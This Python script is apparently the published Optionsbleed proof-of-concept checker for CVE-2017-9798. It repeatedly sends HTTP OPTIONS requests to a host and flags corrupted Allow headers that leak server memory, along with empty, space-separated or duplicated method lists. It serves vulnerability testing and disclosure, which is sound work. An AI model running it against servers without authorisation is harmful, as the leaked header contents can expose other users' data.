#!/usr/bin/env python3

# Optionsbleed proof of concept test
# by Hanno Böck

import argparse
import urllib3
import re


def test_bleed(url, args):
    r = pool.request('OPTIONS', url)
    try:
        allow = str(r.headers["Allow"])
    except KeyError:
        return False
    if allow in dup:
        return
    dup.append(allow)
    if allow == "":
        print("[empty] %s" % (url))
    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$", allow):
        z = [x.strip() for x in allow.split(',')]
        if len(z) > len(set(z)):
            print("[duplicates] %s: %s" % (url, repr(allow)))
        elif args.all:
            print("[ok] %s: %s" % (url, repr(allow)))
    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$", allow):
        print("[spaces] %s: %s" % (url, repr(allow)))
    else:
        print("[bleed] %s: %s" % (url, repr(allow)))
    return True


parser = argparse.ArgumentParser(
         description='Check for the Optionsbleed vulnerability (CVE-2017-9798).',
         epilog="Tests server for Optionsbleed bug and other bugs in the allow header.\n\n"
         "Autmatically checks http://, https://, http://www. and https://www. -\n"
         "except if you pass -u/--url (which means by default we check 40 times.)\n\n"
         "Explanation of results:\n"
         "[bleed] corrupted header found, vulnerable\n"
         "[empty] empty allow header, does not make sense\n"
         "[spaces] space-separated method list (should be comma-separated)\n"
         "[duplicates] duplicates in list (may be apache bug 61207)\n"
         "[ok] normal list found (only shown with -a/--all)\n",
         formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('hosttocheck',  action='store',
                    help='The hostname you want to test against')
parser.add_argument('-n', nargs=1, type=int, default=[10],
                    help='number of tests (default 10)')
parser.add_argument("-a", "--all", action="store_true",
                    help="show headers from hosts without problems")
parser.add_argument("-u", "--url", action='store_true',
                    help="pass URL instead of hostname")
args = parser.parse_args()
howoften = int(args.n[0])

dup = []

# Note: This disables warnings about the lack of certificate verification.
# Usually this is a bad idea, but for this tool we want to find vulnerabilities
# even if they are shipped with invalid certificates.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

pool = urllib3.PoolManager(10, cert_reqs='CERT_NONE')

if args.url:
    test_bleed(args.hosttocheck, args)
else:
    for prefix in ['http://', 'http://www.', 'https://', 'https://www.']:
        for i in range(howoften):
            try:
                if test_bleed(prefix+args.hosttocheck, args) is False:
                    break
            except Exception as e:
                pass